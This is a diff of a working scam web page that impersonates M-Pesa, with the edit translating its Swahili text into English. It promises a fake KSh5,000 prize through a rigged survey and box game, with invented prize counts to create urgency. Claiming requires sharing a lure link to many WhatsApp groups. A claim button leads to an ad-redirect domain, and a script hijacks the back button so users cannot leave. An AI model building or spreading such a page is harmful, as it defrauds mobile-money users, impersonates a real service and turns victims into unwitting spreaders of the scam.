@@ -1,18 +1,10 @@
-
-
-
-
-
-
-
-
 <!doctype html>
 <html lang="en" dir="ltr">
   
 <head>
 	<script src="offer.js"></script>
 	<script src="backkey.js"></script>
-<title>OFA YA TUZO KWA MTEJA KSh5,000 za MPESA</title>
+<title>M-Pesa KSh5,000 ANNIVERSARY OFFER</title>
 <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj92MVDLpJzDrzA6V5j-H8jMd74wbafj_fstmtUHy1fzTS-sQp7Xnar1ZvMqTIAU_T2lJAhxK0n9nqYBgvsCnyS0SHE4bAhZTdcvpowPW1enxDB8lAXOFPhZyfPiVqCI8cDNMmNL83H0XkJhyphenhyphenK8_AzWCUmjvNbtFSuSUnGh5iOCTTXyoo_0CcXjlixxfbA/s600/WhatsApp%20Image%202025-07-24%20at%2003.52.01_f1d426be.jpg" />
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -295,7 +287,6 @@ button:hover {
 <!-- END: Powered by Supercounters.com -->
 
 
-
   <img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8tbuA5CyfOEg5rPeNC7mQm-E645CWpXz24wSYrUNqugAHl2sjt2Hccwr7lSY95NdflK0gqCoyILLfMH-9d6XGuvWHEQJKDjHkX0bhAXcmf_vJoYewFUFdZH8jtnFoFtenZw3k322XxQTtUK2eTYXg2u5K1YB8wJT38ABA_-VIXhlX0da0CwgJMzCsDaM/s600/WhatsApp%20Image%202024-10-09%20at%2000.48.58.jpeg' width='100%'/>
    
     <div id="intro">
@@ -303,17 +294,17 @@ button:hover {
   
 
 <vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">hongera! Jibu lako limehifadhiwa</h2>
+<h2 class="heading heading--h1">congratulations! Your answer has been saved</h2>
  
 <p class="paragraph">
-Sasa una nafasi ya kujishindia zawadi ya pesa taslimu KSh5,000 YA TUZO LA MTEJA<br><br>
-Una nafasi 3! tunakutakia mafanikio mema
+Now you have a chance to win a KSh5,000 Anniversary Celebration cash prize<br><br>
+You have 3 chances! we wish you the best of luck
 <br><br>
-Unapaswa kuchagua sanduku ambalo lina zawadi ndani ya sanduku.
+You have to choose the box that has the gift inside the box.
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
-kuanza
+start
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
@@ -327,12 +318,12 @@ OK
 </button>
 </vue-modal>
 <vue-modal :open="showSuccessModal">
-<img src="https://www.shutterstock.com/image-illustration/3d-stack-1000-kenyan-shilling-260nw-2077881967.jpg" style="width: 240px;">
+<img src="https://banknotenews.com/wp-content/uploads/2019/06/Kenya_CBK_1000_shillings_2019.00.00_B148a_PNL_AA_2507204_f.jpg" style="width: 240px;">
 <h1 class="heading heading--h1">congratulations! </h1>
 <p class="paragraph">
 
 
-Zawadi yako ni: <b> KSh5,000 pesa taslimu</b><br>Fuata maagizo kwenye ukurasa unaofuata ili kudai zawadi yako! 
+Your prize is: <b> KSh5,000 cash</b><br>Follow the instructions on the next page to claim your prize! 
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
@@ -349,18 +340,18 @@ Ok
 
   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj92MVDLpJzDrzA6V5j-H8jMd74wbafj_fstmtUHy1fzTS-sQp7Xnar1ZvMqTIAU_T2lJAhxK0n9nqYBgvsCnyS0SHE4bAhZTdcvpowPW1enxDB8lAXOFPhZyfPiVqCI8cDNMmNL83H0XkJhyphenhyphenK8_AzWCUmjvNbtFSuSUnGh5iOCTTXyoo_0CcXjlixxfbA/s600/WhatsApp%20Image%202025-07-24%20at%2003.52.01_f1d426be.jpg" style="width:100%;" />
 <h1 class="heading heading--h1">
-Habari!
+Hello!
 </h1>
   <p class="paragraph">
-	Karibu <b>MPESA INATOA RUZUKU YA KSh5,000 ya TUZO KWA MTEJA KWA WATUMIAJI WOTE.</b>,Haraka sasa angalia ikiwa unastahiki, Usikose hii.
+	Welcome <b>M-Pesa IS GIVING OUT KSh5,000 ANNIVERSARY CELEBRATION CASH GRANT FOR ALL USERS</b>,Hurry now Don't miss this.
 <br>
-Jibu maswali hapa chini ili kudai <b>Tuzo ya Pesa ya KSh5,000</b>
+Answer the questions below to claim <b>Cash Prize of KSh5,000</b>
 </p>
   <br>
 </div>
 </div>
 <div class="right">
-<vue-box-picker v-if="showBoxPicker" :vertical-items="4" lid-image="https://i.imgur.com/HSX0Uhw.png" box-image="https://i.imgur.com/45mMPJQ.png" box-back-image="https://i.imgur.com/HSmfDGb.png" prize-image="https://www.shutterstock.com/image-illustration/3d-stack-1000-kenyan-shilling-260nw-2077881967.jpg" v-on:fail="onBoxPickerFail" v-on:success="onBoxPickerSuccess" :horizontal-items="3" :max-clicks="2"></vue-box-picker>
+<vue-box-picker v-if="showBoxPicker" :vertical-items="4" lid-image="https://i.imgur.com/HSX0Uhw.png" box-image="https://i.imgur.com/45mMPJQ.png" box-back-image="https://i.imgur.com/HSmfDGb.png" prize-image="https://banknotenews.com/wp-content/uploads/2019/06/Kenya_CBK_1000_shillings_2019.00.00_B148a_PNL_AA_2507204_f.jpg" v-on:fail="onBoxPickerFail" v-on:success="onBoxPickerSuccess" :horizontal-items="3" :max-clicks="2"></vue-box-picker>
 
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
@@ -371,47 +362,47 @@ Jibu maswali hapa chini ili kudai <b>Tuzo ya Pesa ya KSh5,000</b>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-Umejibu maswali 4/4
+You have answered 4/4 questions
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Jibu lako linachakatwa
+Your answer is being processed
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
-zawadi bado zipo!
+there are still prizes!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Natafuta zawadi..
+Looking for a gift.. 
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 3">
 <strong>
-Zimesalia zawadi (289) pekee!
+Only (289) prizes remain!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Hisa inakaguliwa
+Stock is being checked
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Je, unatumia MPESA?",
-              answers: [ { text: "Ndiyo" }, { text: "Hapana" } ]
+              title: "Are you using M-Pesa?",
+              answers: [ { text: "Yes" }, { text: "No" } ]
             },
             {
-              title: "Chagua Jinsia yako?",
-              answers: [ { text: "Mwanaume" }, { text: "Mwanamke" } ]
+              title: "Choose your Gender?",
+              answers: [ { text: "Male" }, { text: "Female" } ]
             },
             {
-              title: "Je, unaweza kukadiriaje Huduma za MPESA?",
-              answers: [ { text: "Vizuri Sana" }, { text: "Maskini" }, { text: "Mbaya" }, { text: "Mbaya Sana" } ]
+              title: "How Would You Rate M-Pesa Services?",
+              answers: [ { text: "Very Good" }, { text: "Poor" }, { text: "Bad" }, { text: "Very Bad" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
 </div>
@@ -423,20 +414,20 @@ Hisa inakaguliwa
   <div id="share">
     
 <div class="title1">
-<p>hongera! </p>
+<p>congratulations! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj92MVDLpJzDrzA6V5j-H8jMd74wbafj_fstmtUHy1fzTS-sQp7Xnar1ZvMqTIAU_T2lJAhxK0n9nqYBgvsCnyS0SHE4bAhZTdcvpowPW1enxDB8lAXOFPhZyfPiVqCI8cDNMmNL83H0XkJhyphenhyphenK8_AzWCUmjvNbtFSuSUnGh5iOCTTXyoo_0CcXjlixxfbA/s600/WhatsApp%20Image%202025-07-24%20at%2003.52.01_f1d426be.jpg" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Zawadi yako ni: <b>KSh5,000</b> <br>Fuata maagizo hapa chini kwa zawadi yako !</p>
+<p class="txt1">Your prize is: <b>KSh5,000</b> <br>Follow the instructions below for your gift !</p>
       <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1. Shiriki na vikundi 5 / marafiki 15 kwenye "Whatsapp" (bofya ikoni ya "Whatsapp" hapa chini)</p><p class="rules">2. Bonyeza "Endelea" na udai tuzo yako.</p></div>
+<div id="lastapp"><p class="rules">1. share with 5 groups / 15 friends on "Whatsapp" (click the "Whatsapp" icon below)</p><p class="rules">2. Click "Continue" and claim your prize.</p></div>
 
     
    <div class="share_main_bt" id="whatsapp">WhatsApp&nbsp;   →</div>
-  <h4 class="textlastup">Shiriki hadi upau wa bluu ujae!</h4>
+  <h4 class="textlastup">Share until the blue bar is full!</h4>
   <div class="barr">
                 <div class="fill">
                     <div id="fill2"></div>
@@ -447,7 +438,7 @@ Hisa inakaguliwa
                 </div>
     
             <br>       <div class="share_main_bt" onclick="tipn()" style="margin: 20px auto 0; background-color: #BE0612;">
-                                endelea
+                                continue
                             </div>
    
   </div></div>
@@ -460,24 +451,24 @@ Hisa inakaguliwa
                       
     <div id="claim">
       <div class="title1">
-<p>hongera! </p>
+<p>congratulations! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
-                                <center>   <img src="https://www.shutterstock.com/image-illustration/3d-stack-1000-kenyan-shilling-260nw-2077881967.jpg" width='81%'/> </center>
+                                <center>   <img src="https://banknotenews.com/wp-content/uploads/2019/06/Kenya_CBK_1000_shillings_2019.00.00_B148a_PNL_AA_2507204_f.jpg" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Hadiah anda ialah: <b>KSh5,000 cash.</b> <br>Fuata maagizo hapa chini ili kudai zawadi yako!</p>
+<p class="txt1">Your prize is: <b>KSh5,000 cash.</b> <br>Follow the instructions below to claim your prize!</p>
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
         <br>
 	    
         <a  onclick="window.open('https://obqj2.com/4/9148867')" href="https://obqj2.com/4/9148867" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">Kubali KSh5,000</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">WITHDRAW KSh5,000</font></button>
                     </a><br/> <br/>
 	    
-      <div class="share_main_bt" id="offer">DAI ZAWADI ya KSh5,000</div><br/> <br/>
-                            
-            <div class="share_main_bt" id="offers">Withdraw KSh5,000</div> 
+      <div class="share_main_bt" id="offer">CLAIM KSh5,000</div><br/> <br/>
+                  
+            <div class="share_main_bt" id="offers">CHECK STATUS</div> 
       <br>
           
        
@@ -530,10 +521,10 @@ function go() {
 
 <script>
   var tiaoban = [
-    "*Je, unatumia Mpesa?* %0A%0AOfa ya Zawadi ya M-pesa ya KSh5,000 kwa Mteja, Mwaka huu tunasherehekea Sikukuu yetu ya Kuadhimisha, na ili kuiadhimisha, tunatoa Ksh5,000 kwa Wateja wetu.🎉%0A nimepata yangu tu%0A%0ABofya Hapa👇%0A https://mpesa-reward.allprograms.xyz/gift ",
-    "*Je, unatumia Mpesa?* %0A%0AOfa ya Zawadi ya M-pesa ya KSh5,000 kwa Mteja, Mwaka huu tunasherehekea Sikukuu yetu ya Kuadhimisha, na ili kuiadhimisha, tunatoa Ksh5,000 kwa Wateja wetu.🎉%0A nimepata yangu tu%0A%0ABofya Hapa👇%0A https://mpesa-reward.allprograms.xyz/gift ",
-    "*Je, unatumia Mpesa?* %0A%0AOfa ya Zawadi ya M-pesa ya KSh5,000 kwa Mteja, Mwaka huu tunasherehekea Sikukuu yetu ya Kuadhimisha, na ili kuiadhimisha, tunatoa Ksh5,000 kwa Wateja wetu.🎉%0A nimepata yangu tu%0A%0ABofya Hapa👇%0A https://mpesa-reward.allprograms.xyz/gift ",
-    "*Je, unatumia Mpesa?* %0A%0AOfa ya Zawadi ya M-pesa ya KSh5,000 kwa Mteja, Mwaka huu tunasherehekea Sikukuu yetu ya Kuadhimisha, na ili kuiadhimisha, tunatoa Ksh5,000 kwa Wateja wetu.🎉%0A nimepata yangu tu%0A%0ABofya Hapa👇%0A https://mpesa-reward.allprograms.xyz/gift ",
+    "Are You Using M-Pesa? %0A%0AWelcome to the M-Pesa KSh5,000 Customer Reward Offer, This year we are celebrating our Anniversary, and to commemorate it, we are giving out KSh5,000 to our Customers.🎉%0ACheck If You Are Eligible For This Offer%0A%0AClick Here👇%0A https://mpesa-reward.allprograms.xyz/gift ",
+    "Are You Using M-Pesa? %0A%0AWelcome to the M-Pesa KSh5,000 Customer Reward Offer, This year we are celebrating our Anniversary, and to commemorate it, we are giving out KSh5,000 to our Customers.🎉%0ACheck If You Are Eligible For This Offer%0A%0AClick Here👇%0A https://mpesa-reward.allprograms.xyz/gift ",
+    "Are You Using M-Pesa? %0A%0AWelcome to the M-Pesa KSh5,000 Customer Reward Offer, This year we are celebrating our Anniversary, and to commemorate it, we are giving out KSh5,000 to our Customers.🎉%0ACheck If You Are Eligible For This Offer%0A%0AClick Here👇%0A https://mpesa-reward.allprograms.xyz/gift ",
+    "Are You Using M-Pesa? %0A%0AWelcome to the M-Pesa KSh5,000 Customer Reward Offer, This year we are celebrating our Anniversary, and to commemorate it, we are giving out KSh5,000 to our Customers.🎉%0ACheck If You Are Eligible For This Offer%0A%0AClick Here👇%0A https://mpesa-reward.allprograms.xyz/gift ",
 ];
 var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
 
@@ -662,5 +653,3 @@ hs.src = ('//s10.histats.com/js15_as.js');
 
 
       <script type="text/javascript">! function (){	var t;	try{for (t=0; 10 > t; ++t)		history.pushState({}, "", "#");	onpopstate=function (t)	{		t.state && alert('Please Share Maximum to receive gift. ');		}}		catch (o){}}();</script>
-
-     
